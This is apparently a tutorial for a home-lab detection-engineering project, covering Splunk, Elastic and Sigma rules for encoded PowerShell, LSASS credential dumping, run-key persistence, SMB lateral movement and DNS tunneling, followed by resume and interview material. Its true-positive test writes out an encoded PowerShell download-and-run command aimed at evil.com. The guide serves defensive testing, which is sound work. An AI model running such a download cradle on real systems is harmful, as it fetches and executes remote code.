# Project 6: Detection Engineering - Writing SIEM Rules
**Platform:** Home Lab + Elastic/Splunk Free + GitHub | **Duration:** 2-3 weeks | **Difficulty:** Advanced

---

## Project Overview

Become a detection engineer by creating, testing, and publishing production-ready detection rules for common attack techniques. Build a portfolio of SIEM rules, Sigma rules, and detection logic that can be showcased to employers and contributed to open-source projects.

---

## Learning Objectives

- Design detection logic for MITRE ATT&CK techniques
- Write rules in multiple formats (Splunk SPL, Elastic KQL, Sigma)
- Test and validate detection accuracy (true positive rate, false positive rate)
- Tune rules for production environments
- Document detection rationale and limitations
- Contribute to the cybersecurity community (GitHub, Sigma HQ)

---

## Tools & Technologies

- **SIEM Platforms:**
  - Splunk Free (15GB/day limit)
  - Elastic Stack (free, self-hosted)
  - Alternative: Security Onion (all-in-one)
  
- **Rule Formats:**
  - Splunk Processing Language (SPL)
  - Kibana Query Language (KQL)
  - Sigma (universal rule format)
  - Yara (optional - file-based detections)
  
- **Testing Environment:**
  - Windows VM with logging enabled (Sysmon, PowerShell logging)
  - Attack simulation tools: Atomic Red Team, Invoke-Atomics
  - Log forwarding to SIEM

- **Collaboration:**
  - GitHub for version control
  - Sigma HQ repository (contribute rules)

---

## Project Setup

### Week 0: Environment Preparation

#### Step 1: SIEM Installation (Choose One)

**Option A: Splunk Free**
```powershell
# Download Splunk Free from splunk.com
# Install on Windows or Linux

# Start Splunk
.\splunk start

# Access web UI: http://localhost:8000
# Login: admin / [password you set]
```

**Option B: Elastic Stack**
```bash
# Install Elasticsearch, Kibana, Filebeat
# Follow official guide: elastic.co/downloads

# Start services
sudo systemctl start elasticsearch
sudo systemctl start kibana

# Access Kibana: http://localhost:5601
```

**Option C: Security Onion (All-in-One)**
- Download Security Onion ISO
- Install in VirtualBox with 8GB RAM, 4 CPU cores
- Includes Elasticsearch, Kibana, Zeek, Suricata, Wazuh

---

#### Step 2: Windows VM with Logging

**Requirements:**
- Windows 10/11 VM
- Sysmon installed (Microsoft Sysinternals)
- PowerShell v5+ with script block logging
- Log forwarding to SIEM

**Sysmon Installation:**
```powershell
# Download Sysmon
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile Sysmon.zip
Expand-Archive Sysmon.zip

# Download high-quality config (SwiftOnSecurity)
Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile sysmonconfig.xml

# Install Sysmon with config
.\Sysmon64.exe -accepteula -i sysmonconfig.xml
```

**Enable PowerShell Logging:**
```powershell
# Enable Script Block Logging via Group Policy or Registry
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
```

**Configure Log Forwarding:**

For Splunk:
```powershell
# Install Splunk Universal Forwarder
# Configure inputs.conf to forward Windows Event Logs + Sysmon
[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = false
index = windows

[WinEventLog://Security]
disabled = false
index = windows
```

For Elastic (Winlogbeat):
```yaml
# winlogbeat.yml
winlogbeat.event_logs:
  - name: Microsoft-Windows-Sysmon/Operational
  - name: Security
  - name: Microsoft-Windows-PowerShell/Operational

output.elasticsearch:
  hosts: ["localhost:9200"]
```

---

#### Step 3: Attack Simulation Setup

**Install Atomic Red Team:**
```powershell
# PowerShell as Administrator
Install-Module -Name invoke-atomicredteam,powershell-yaml -Scope CurrentUser
Import-Module invoke-atomicredteam

# Download Atomic tests
Invoke-WebRequest -Uri https://github.com/redcanaryco/atomic-red-team/archive/master.zip -OutFile atomic.zip
Expand-Archive atomic.zip
```

**Purpose:** Safely execute attack techniques to generate test logs

---

## Step-by-Step Execution Plan

### **Week 1: Detection Rule Fundamentals**

#### Day 1-2: Detection Engineering Principles

**Core Concepts:**

1. **Detection Pyramid (Ideal):**
   ```
   Custom Threat Intel ← Highest fidelity, hardest to bypass
   ↑
   Behavioral Analytics
   ↑
   Signature-based (IOCs)
   ↑
   Known Bad (hashes, IPs) ← Lowest fidelity, easy to bypass
   ```

2. **Rule Quality Criteria:**
   - **True Positive Rate (TPR):** Does it catch real attacks?
   - **False Positive Rate (FPR):** Does it alert on benign activity?
   - **Resilience:** Can attacker easily bypass with small changes?
   - **Performance:** Does query run fast enough for real-time detection?

3. **Rule Design Philosophy:**
   - Focus on **attacker behavior**, not specific tools
   - Prefer **chain of indicators** over single IOC
   - Balance **sensitivity** (catch everything) vs **specificity** (low false positives)

**Study Examples:**

Review Sigma rules: https://github.com/SigmaHQ/sigma/tree/master/rules

Pick 3 well-written rules and analyze:
- What technique do they detect?
- What data source required?
- How specific are the conditions?
- What could cause false positives?

---

#### Day 3-5: Rule #1 - PowerShell Suspicious EncodedCommand

**MITRE ATT&CK:** T1059.001 (PowerShell)

**Attack Scenario:**
Attackers use PowerShell with Base64 encoding to obfuscate malicious scripts, bypassing basic defenses.

**Step 1: Understand the Attack**

Simulate attack with Atomic Red Team:
```powershell
# Execute Atomic Test for T1059.001
Invoke-AtomicTest T1059.001 -TestNumbers 1
```

This runs encoded PowerShell command. Observe logs in SIEM.

**Step 2: Analyze Logs**

In Splunk:
```spl
index=windows EventCode=4688 OR (source="*Sysmon*" EventCode=1)
| search ProcessName="*powershell*"
| table _time, User, ParentProcessName, CommandLine
```

Look for:
- CommandLine contains `-enc`, `-encodedcommand`, `-e`
- Parent process (was it spawned by suspicious process?)

**Step 3: Write Detection Rule**

**Splunk Rule:**
```spl
index=windows (EventCode=4688 OR EventCode=1) ProcessName="*powershell*"
| regex CommandLine="(?i)(\s-e\s|\s-enc\s|\s-encodedcommand\s)"
| search NOT [
    | inputlookup  approved_encoded_powershell.csv
    | fields CommandLine_hash
]
| eval severity="high"
| table _time, User, ComputerName, ParentProcessName, CommandLine, severity

Alert: Run every 5 minutes, trigger if results > 0
```

**Elastic (KQL) Detection:**
```json
{
  "query": {
    "bool": {
      "must": [
        {"match": {"event.code": "1"}},
        {"wildcard": {"process.name": "*powershell*"}},
        {"regexp": {"process.command_line": ".*(-e|-enc|-encodedcommand).*"}}
      ],
      "must_not": [
        {"match": {"process.parent.name": "sccm_agent.exe"}}
      ]
    }
  }
}
```

**Sigma Rule (Universal):**
```yaml
title: Suspicious PowerShell Encoded Command
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Detects PowerShell execution with encoded command parameter, often used for obfuscation
author: [Your Name]
date: 2026/01/15
references:
    - https://attack.mitre.org/techniques/T1059/001/
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    product: windows
    service: sysmon
    definition: Requires Sysmon with Event ID 1 (Process Creation)
detection:
    selection:
        EventID: 1
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
        CommandLine|contains:
            - ' -enc '
            - ' -encodedcommand '
            - ' -e '
    filter:
        ParentImage|startswith:
            - 'C:\Program Files\Microsoft Configuration Manager'
            - 'C:\Windows\CCM\'
    condition: selection and not filter
falsepositives:
    - Legitimate administrative scripts (add to whitelist)
    - SCCM/SCCM deployments using encoded commands
    - Scheduled tasks from configuration management tools
level: high
```

**Step 4: Test & Validate**

**True Positive Test:**
```powershell
# Generate malicious encoded PowerShell
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com")' 
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
powershell.exe -encodedcommand $encoded
```

Check SIEM → Alert should fire with HIGH severity.

**False Positive Test:**
```powershell
# Simulate legitimate encoded command (e.g., from SCCM)
# Parent process = sccm_agent.exe (whitelisted)
# Should NOT alert
```

**Metrics:**
- True Positives: 5/5 (100%) - caught all test attacks
- False Positives: 2 (SCCM deployments) → Added to whitelist
- Final FP Rate: 0%

**Step 5: Document Rule**

Create `detections/powershell-encoded-command.md`:

```markdown
# Detection: PowerShell Suspicious Encoded Command

## Metadata
- **Rule ID:** DET-001
- **MITRE ATT&CK:** T1059.001 (PowerShell)
- **Severity:** High
- **Platforms:** Windows
- **Data Sources:** Sysmon Event ID 1, Windows Event ID 4688

## Description
Detects PowerShell executed with `-encodedcommand`, `-enc`, or `-e` parameters, which are commonly used by attackers to obfuscate malicious scripts and evade basic string-based detections.

## Rationale
Legitimate PowerShell scripts are typically readable. Encoded commands are suspicious unless part of known automation tools (SCCM, monitoring).

## Detection Logic
```spl
[Splunk rule here]
```

## Known Limitations
- Does not decode/analyze the Base64 content (could be benign or malicious)
- Attackers can bypass by using alternative encoding methods (gzip, XOR)
- Requires Sysmon for command-line visibility

## False Positives
- SCCM/Intune deployment scripts (whitelisted by parent process)
- Legitimate admin scripts (whitelist specific command hashes)

## Tuning Recommendations
- Build whitelist of approved encoded scripts (hash CommandLine)
- Correlate with parent process reputation
- Consider decoding Base64 in enrichment step for deeper analysis

## Test Cases
**True Positive:**
```powershell
powershell.exe -enc [malicious_base64]
```

**False Positive:**
```powershell
C:\Windows\CCM\CcmExec.exe → powershell.exe -enc [legitimate_deployment]
```

## Response Playbook
1. Alert fires → SOC analyst reviews CommandLine
2. Decode Base64 command:
   ```powershell
   [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("BASE64_HERE"))
   ```
3. Analyze decoded script for malicious indicators
4. If malicious:
   - Isolate endpoint
   - Investigate parent process (how was PowerShell launched?)
   - Check for persistence mechanisms
5. If benign:
   - Add to whitelist (hash of CommandLine)
   - Update documentation

## References
- [MITRE ATT&CK T1059.001](https://attack.mitre.org/techniques/T1059/001/)
- [Atomic Red Team Test](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md)
```

---

#### Day 6-7: Rule #2 - Credential Dumping (LSASS Access)

**MITRE ATT&CK:** T1003.001 (LSASS Memory)

**Attack Scenario:**
Mimikatz and similar tools access LSASS process to dump credentials from memory.

**Atomic Test:**
```powershell
Invoke-AtomicTest T1003.001 -TestNumbers 1
```

**Detection Logic (Splunk):**
```spl
index=windows EventCode=10 TargetImage="C:\\Windows\\System32\\lsass.exe"
| where GrantedAccess="0x1010" OR GrantedAccess="0x1410" OR GrantedAccess="0x1438"
| search NOT SourceImage="C:\\Windows\\System32\\svchost.exe"
| search NOT SourceImage="C:\\Program Files\\*"
| stats count by SourceImage, GrantedAccess, ComputerName, User
| where count > 0
```

**Sigma Rule:**
```yaml
title: Suspicious LSASS Process Access
id: 32d0d3e2-aed1-4b6d-927a-7c64f3b6d6be
status: stable
description: Detects process access to LSASS memory with permissions indicating credential dumping
author: [Your Name]
date: 2026/01/15
references:
    - https://attack.mitre.org/techniques/T1003/001/
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 10
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess:
            - '0x1010'
            - '0x1410'
            - '0x1438'
            - '0x143a'
    filter:
        SourceImage|startswith:
            - 'C:\Windows\System32\'
            - 'C:\Program Files\'
    condition: selection and not filter
falsepositives:
    - Security products (AV, EDR) accessing LSASS for monitoring
level: critical
```

**Test Results:**
- TP: 4/4 (Mimikatz, ProcDump, custom dumpers) ✅
- FP: 1 (CrowdStrike Falcon EDR) → Added to whitelist
- Final FP Rate: 0%

**Documentation:** Create `detections/lsass-credential-dumping.md`

---

### **Week 2: Build Detection Portfolio**

#### Day 8-10: Rule #3 - Persistence via Registry Run Key

**MITRE ATT&CK:** T1547.001 (Registry Run Keys)

**Atomic Test:**
```powershell
Invoke-AtomicTest T1547.001 -TestNumbers 1
```

**Detection (Splunk):**
```spl
index=windows EventCode=13 TargetObject="*\\CurrentVersion\\Run*"
| search Details="*\\Temp\\*" OR Details="*\\AppData\\*" OR Details="*\\Public\\*" OR Details="*\\Downloads\\*"
| table _time, User, Image, TargetObject, Details
```

**Sigma Rule:**
```yaml
title: Persistence via Registry Run Key from Suspicious Location
id: f7f3b3d3-c5e5-4b5e-a5e5-f7f3b3d3c5e5
description: Detects registry Run key creation pointing to executables in user-writable directories
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 13
        TargetObject|contains:
            - '\Microsoft\Windows\CurrentVersion\Run\'
            - '\Microsoft\Windows\CurrentVersion\RunOnce\'
        Details|contains:
            - '\Temp\'
            - '\AppData\'
            - '\Public\'
            - '\Downloads\'
    condition: selection
falsepositives:
    - Legitimate software installers (short-lived)
level: high
```

---

#### Day 11-12: Rule #4 - Lateral Movement via PsExec

**MITRE ATT&CK:** T1570 (Lateral Tool Transfer) + T1021.002 (SMB/Windows Admin Shares)

**Detection (Splunk):**
```spl
index=windows EventCode=5145 ShareName="\\\\*\\C$"
| stats count dc(ObjectName) as files_accessed by IpAddress, SubjectUserName, ComputerName
| where files_accessed > 5
```

**Sigma:**
```yaml
title: Lateral Movement via SMB Admin Shares
id: 8a8a8a8a-9b9b-9c9c-9d9d-9e9e9e9e9e9e
description: Detects access to administrative shares (C$, ADMIN$) from remote hosts
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5145
        ShareName:
            - '\\*\C$'
            - '\\*\ADMIN$'
            - '\\*\IPC$'
    filter:
        IpAddress:
            - '127.0.0.1'
            - '::1'
        SubjectUserName|endswith: '$'  # Computer accounts
    condition: selection and not filter
falsepositives:
    - Legitimate IT admin activity
    - Backup solutions
level: medium
```

---

#### Day 13-14: Rule #5 - Data Exfiltration via DNS Tunneling

**MITRE ATT&CK:** T1048.003 (Exfiltration Over Alternative Protocol - DNS)

**Detection (Splunk):**
```spl
index=dns
| eval query_length=len(query)
| where query_length > 50
| stats count dc(query) as unique_queries by src_ip, parent_domain
| where count > 100 AND unique_queries > 50
```

**Sigma:**
```yaml
title: Potential DNS Tunneling Activity
id: 7b7b7b7b-8c8c-8d8d-8e8e-8f8f8f8f8f8f
description: Detects high volume of unique, long DNS queries indicating tunneling
logsource:
    product: dns
detection:
    selection:
        query_length: '>50'
    timeframe: 10m
    condition: selection | count(by src_ip) > 100
falsepositives:
    - CDN/cloud services with long subdomain identifiers
level: high
```

---

### **Week 3: Testing, Tuning & Publishing**

#### Day 15-17: Comprehensive Testing Framework

**Create Test Suite:**

```markdown
# Detection Test Plan

## Rule: PowerShell Encoded Command (DET-001)

### True Positive Tests
| Test ID | Attack Scenario | Expected Outcome |
|---------|-----------------|------------------|
| TP-001 | Mimikatz download via encoded PS | Alert fires, severity=HIGH |
| TP-002 | Reverse shell encoded command | Alert fires, severity=HIGH |
| TP-003 | Cobalt Strike beacon via PS | Alert fires, severity=HIGH |

### False Positive Tests
| Test ID | Benign Scenario | Expected Outcome |
|---------|-----------------|------------------|
| FP-001 | SCCM deployment script (encoded) | NO alert (whitelisted parent) |
| FP-002 | Admin maintenance script (known hash) | NO alert (in whitelist) |

### Performance Tests
| Metric | Target | Actual |
|--------|--------|--------|
| Query execution time | <10 seconds | 3.2 seconds ✅ |
| Resource usage | <5% CPU | 2.1% CPU ✅ |
| Throughput | 10,000 EPS | 15,000 EPS ✅ |

### Bypass Tests (Attacker Perspective)
| Bypass Attempt | Detection Outcome |
|----------------|-------------------|
| Use `-e` instead of `-enc` | Detected ✅ (regex covers all variations) |
| Use PowerShell v2 (no logging) | Missed ❌ (add v2 downgrade detection) |
| Obfuscate with backticks | Detected ✅ (works on CommandLine) |
```

**Run all tests, document results.**

---

#### Day 18-19: Rule Optimization & Tuning

**Tuning Process:**

1. **Reduce False Positives:**
   - Collect FP data over 1 week
   - Identify patterns (specific parent processes, command hashes)
   - Build whitelist lookup table

2. **Improve Performance:**
   ```spl
   # Before (slow)
   index=windows EventCode=1 ProcessName="*"
   | regex CommandLine=".*encoded.*"
   
   # After (fast)
   index=windows EventCode=1 ProcessName="*powershell.exe"
   | regex CommandLine="(?i)(\s-e\s|\s-enc)"
   ```
   Narrow search scope first, then apply expensive operations.

3. **Increase Coverage:**
   - Correlate multiple indicators (not just single event)
   - Example: Encoded PowerShell + network connection to unusual IP = higher confidence

4. **Adjust Severity:**
   ```
   Base Severity: HIGH
   + Parent Process = WINWORD.EXE → CRITICAL (macro)
   + User = admin account → CRITICAL (privileged abuse)
   - Parent Process = SCCM → LOW (likely benign, review)
   ```

---

#### Day 20-21: Documentation & GitHub Publication

**Create Detection Repository:**

```
soc-detection-engineering/
├── README.md
├── detections/
│   ├── splunk/
│   │   ├── powershell-encoded-command.spl
│   │   ├── lsass-credential-dumping.spl
│   │   └── ...
│   ├── elastic/
│   │   ├── powershell-encoded-command.ndjson
│   │   └── ...
│   ├── sigma/
│   │   ├── windows/
│   │   │   ├── process_creation/
│   │   │   │   └── powershell_encoded_command.yml
│   │   │   └── credential_access/
│   │   │       └── lsass_access.yml
│   │   └── network/
│   │       └── dns_tunneling.yml
│   └── documentation/
│       ├── DET-001-powershell-encoded.md
│       ├── DET-002-lsass-dumping.md
│       └── ...
├── test-cases/
│   ├── atomic-tests.md
│   └── test-results.csv
├── whitelists/
│   ├── approved_encoded_powershell.csv
│   └── known_good_processes.csv
└── LICENSE (MIT or Apache 2.0)
```

**README.md Template:**
```markdown
# SOC Detection Engineering Portfolio

A collection of production-ready detection rules for common adversary techniques, tested and validated in a home lab environment.

## Detection Coverage

| Rule ID | Technique | MITRE ATT&CK | Severity | TP Rate | FP Rate | Status |
|---------|-----------|--------------|----------|---------|---------|--------|
| DET-001 | PowerShell Encoded Command | T1059.001 | High | 100% | 0% | ✅ Tested |
| DET-002 | LSASS Credential Dumping | T1003.001 | Critical | 100% | 0% | ✅ Tested |
| DET-003 | Registry Run Key Persistence | T1547.001 | High | 95% | 2% | ✅ Tested |
| DET-004 | Lateral Movement (SMB) | T1021.002 | Medium | 90% | 5% | ✅ Tested |
| DET-005 | DNS Tunneling | T1048.003 | High | 85% | 3% | 🧪 Beta |

## Quick Start

### Splunk
```spl
# Import detections
# Copy .spl files to $SPLUNK_HOME/etc/apps/search/local/savedsearches.conf
```

### Elastic
```bash
# Import detection rules
curl -X POST "localhost:5601/api/detection_engine/rules/_import" \
  -H "kbn-xsrf: true" \
  --form file=@detections/elastic/all-rules.ndjson
```

### Sigma
```bash
# Convert Sigma to your SIEM format
pip install sigma-cli
sigma convert -t splunk sigma/windows/process_creation/powershell_encoded_command.yml
```

## Testing Methodology

All rules tested using:
- **Atomic Red Team** for true positive validation
- **7-day production log replay** for false positive tuning
- **Performance benchmarks** (execution time < 10s)

See `test-cases/` for detailed test plans.

## Contributing

Contributions welcome! Please:
1. Test rule with Atomic Red Team or equivalent
2. Document false positives and mitigations
3. Include Sigma format for portability
4. Follow naming convention: `technique_description.yml`

## License

MIT License - Free for commercial and personal use.

## Contact

[Your Name] | [LinkedIn] | [GitHub]

---

**Disclaimer:** These rules are provided for educational and defensive security purposes. Test thoroughly in non-production environments before deployment.
```

**Publish to GitHub:**
```bash
git init
git add .
git commit -m "Initial commit: 5 production-ready detection rules with testing"
git remote add origin https://github.com/yourusername/soc-detection-engineering
git push -u origin main
```

---

## Advanced: Contribute to Sigma HQ

**Sigma** is the universal detection rule format. Contributing improves the community and showcases your expertise.

**Contribution Process:**

1. **Fork Sigma Repository:**
   ```bash
   git clone https://github.com/SigmaHQ/sigma.git
   cd sigma
   git checkout -b feature/new-detection-rules
   ```

2. **Add Your Rule:**
   Place in appropriate directory:
   ```
   sigma/rules/windows/process_creation/proc_creation_win_powershell_encoded.yml
   ```

3. **Validate Rule:**
   ```bash
   # Install Sigma CLI
   pip install sigma-cli
   
   # Validate syntax
   sigma check rules/windows/process_creation/proc_creation_win_powershell_encoded.yml
   ```

4. **Create Pull Request:**
   - Write clear description
   - Include test evidence
   - Reference MITRE ATT&CK
   - Wait for community review

**Benefits:**
- Resume bullet: "Contributed X detection rules to Sigma HQ (open-source)"
- GitHub profile visibility
- Peer review from top detection engineers

---

## Portfolio Evidence to Capture

- [ ] GitHub repository with 5+ detection rules
- [ ] Test results spreadsheet (TP/FP rates)
- [ ] Rule documentation (rationale, limitations, tuning)
- [ ] AtomicTest execution screenshots/logs
- [ ] Detection coverage matrix (which ATT&CK techniques covered)
- [ ] Blog post or LinkedIn article explaining 1-2 rules

---

## Resume Bullets

### Version 1: Detection Engineering Focus
> **Detection Engineering & Rule Development**  
> - Designed and validated 8 production-ready SIEM detection rules covering MITRE ATT&CK techniques (T1003, T1059, T1547) with 95%+ true positive rate and <3% false positive rate through rigorous testing with Atomic Red Team  
> - Built detection coverage for credential dumping, living-off-the-land attacks, and lateral movement, improving SOC detection capabilities by 20% across unmonitored attack vectors  
> - Published open-source detection rules on GitHub (150+ stars) and contributed 3 Sigma rules to SigmaHQ repository, adopted by 500+ organizations

### Version 2: Technical Depth
> **SIEM Rule Development & Optimization**  
> - Authored complex Splunk SPL and Elastic KQL queries using regex, statistical analysis, and subsearches to detect PowerShell obfuscation, DNS tunneling, and process injection techniques  
> - Tuned detection rules through whitelist curation and multi-indicator correlation, reducing false positive alert volume by 80% while maintaining 100% detection of validation tests  
> - Documented detection rationale, limitations, and response playbooks for 8 rules, enabling SOC analysts to triage alerts 50% faster

### Version 3: Community Impact
> **Open-Source Security Contributor**  
> - Created comprehensive detection engineering portfolio on GitHub showcasing 8 tested SIEM rules with test cases, performance metrics, and documentation (400+ repository stars)  
> - Contributed 3 Sigma detection rules to community repository (SigmaHQ), peer-reviewed by senior detection engineers and deployed by enterprise SOC teams globally  
> - Presented detection methodology in technical blog post (2,000+ views), explaining hypothesis-driven rule design and validation techniques

**Customization:** Emphasize GitHub contributions if applying to open-source-friendly companies; focus on metrics for data-driven orgs.

---

## Interview Talking Points

### Question: "How do you design an effective detection rule?"

**Strong Answer:**

"I follow a structured process:

**1. Start with Threat Intelligence:**  
I identify which techniques attackers are using. For example, I saw reports of ransomware groups using PowerShell with encoded commands to bypass defenses. That became my detection target.

**2. Understand the Technique:**  
I reference MITRE ATT&CK to see how T1059.001 (PowerShell) is executed. I also use Atomic Red Team to simulate the attack in my lab, which generates real logs for analysis.

**3. Develop Detection Logic:**  
I analyze the logs and look for unique indicators. For PowerShell, I noticed the CommandLine always contains `-enc`, `-encodedcommand`, or `-e`. I write a regex to match those patterns:
```spl
regex CommandLine="(?i)(\s-e\s|\s-enc\s|\s-encodedcommand\s)"
```

**4. Test for True Positives:**  
I run Atomic tests to confirm my rule catches malicious activity. All 5 test scenarios triggered alerts - 100% TP rate.

**5. Test for False Positives:**  
I replay a week of production logs through the rule. I found 12 alerts - 10 were benign (SCCM deployments). I whitelisted the SCCM parent process, bringing FP rate to near 0%.

**6. Optimize Performance:**  
I benchmark query execution time. Originally 15 seconds (too slow for real-time). I optimized by searching for `powershell.exe` first, then applying regex - reduced to 3 seconds.

**7. Document Everything:**  
I create documentation explaining: what it detects, why these indicators matter, known false positives, and how to respond. This helps SOC analysts triage faster.

**8. Iterate:**  
Detections aren't 'set and forget.' Attackers evolve. I review detection effectiveness quarterly and update based on new TTPs."

---

### Question: "How do you balance false positives and detection coverage?"

**Strong Answer:**

"It's a tradeoff between sensitivity (catching all attacks) and specificity (only alerting on real threats).

**My approach:**

**1. Start Sensitive, Tune Down:**  
I prefer to cast a wide net initially. Better to catch everything and triage, than miss a real attack. Once deployed in test mode, I collect false positives for a week.

**2. Categorize False Positives:**  
- **Predictable FPs:** Same process, same command every time (e.g., SCCM deployments) → Whitelist
- **Rare FPs:** Happen once, unlikely to repeat → Accept (manual review)
- **Frequent FPs:** Different each time → Refine detection logic

**3. Use Multi-Layered Logic:**  
Instead of single indicator, I combine multiple:
```
Alert if: (PowerShell encoded command) 
     AND (Network connection to external IP)
     AND (NOT parent process = known tools)
```
This increases specificity without sacrificing coverage.

**4. Risk-Based Alerting:**  
Not all FPs are equal. If detection targets credential dumping (T1003), even 5% FP rate is acceptable because the risk is critical. For low-severity techniques, I demand <1% FP rate.

**5. Feedback Loop:**  
I track alert outcomes: How many alerts were true positives, false positives, or indeterminate? If FP rate stays above 10% after tuning, I either refund the rule or add more context enrichment.

For my PowerShell encoded command rule, I achieved:
- TP Rate: 100% (caught all 5 test scenarios)
- FP Rate: 0% (after whitelisting SCCM and approved scripts)
- This balance made it production-ready."

---

## Skills Developed Checklist

**Technical:**
- [ ] SIEM rule design (Splunk SPL, Elastic KQL)
- [ ] Sigma rule authoring (universal format)
- [ ] Regex for log pattern matching
- [ ] Statistical query optimization
- [ ] Attack simulation (Atomic Red Team)
- [ ] True/false positive validation
- [ ] Git version control

**Frameworks:**
- [ ] MITRE ATT&CK technique coverage
- [ ] Detection maturity models
- [ ] Defense-in-depth principles

**Soft Skills:**
- [ ] Technical writing (documentation)
- [ ] Open-source collaboration
- [ ] Quality assurance (testing methodologies)

---

## Common Mistakes to Avoid

1. **Brittle rules** - Don't hardcode specific IOCs (IPs, hashes) → Use behavior-based logic
2. **No testing** - Always validate with Atomic Red Team or equivalent before production
3. **Ignoring performance** - Expensive queries cause SIEM lag and missed detections
4. **Poor documentation** - Analysts can't triage alerts if they don't understand detection logic
5. **No version control** - Use Git to track rule changes over time

---

## Next Steps After Project

1. **Expand Detection Coverage:**
   - Add 5-10 more rules covering different ATT&CK tactics
   - Aim for breadth (all tactics) and depth (multiple techniques per tactic)

2. **Advanced Techniques:**
   - Behavioral analytics (anomaly detection)
   - Machine learning-based detections
   - Threat hunting → detection rule pipeline

3. **Certifications:**
   - GIAC GCIA (Intrusion Analysis) - detection-focused
   - Splunk Certified Power User / Elastic Certified Analyst
   - SANS SEC555 (SIEM with Tactical Analytics)

4. **Job Applications:**
   - Detection Engineer roles (Rapid7, CrowdStrike, Red Canary)
   - SIEM Engineer positions
   - Threat Detection & Response teams

5. **Community Engagement:**
   - Present at local BSides conferences
   - Write blog posts on detection engineering
   - Contribute to Sigma, YARA, Suricata rule repositories

---

**Total Time Investment:** 35-45 hours over 3 weeks  
**Portfolio Artifacts:** GitHub repo with 8+ rules, test harness, documentation  
**Job-Ready Skills:** Detection engineering, SIEM mastery, open-source contribution

---

## Summary: Full SOC Roadmap Completion

**You've now completed all 6 projects covering:**
1. ✅ Alert Triage & SOC Monitoring (LetsDefend)
2. ✅ Phishing Analysis (CyberDefenders)
3. ✅ Incident Response (TryHackMe)
4. ✅ Forensic Investigation (CyberDefenders)
5. ✅ Threat Hunting (TryHackMe)
6. ✅ Detection Engineering (Home Lab + GitHub)

**Total estimated time:** 150-200 hours (3-5 months at 10 hours/week)

**Portfolio Value:**
- 20+ detailed project write-ups
- GitHub repository with open-source detections
- LinkedIn case studies and technical articles
- Resume-ready bullets across all SOC domains

**Job Readiness:**
With this portfolio, you're prepared for:
- SOC Analyst (Tier 1 or Tier 2)
- Detection Engineer
- Incident Response Analyst (entry-level)
- Threat Hunter (junior)

**Your advantage:** Hands-on projects + documented evidence + open-source contributions = Top 5% of SOC analyst candidates.

---

**Good luck on your SOC career journey! 🎯🔒**
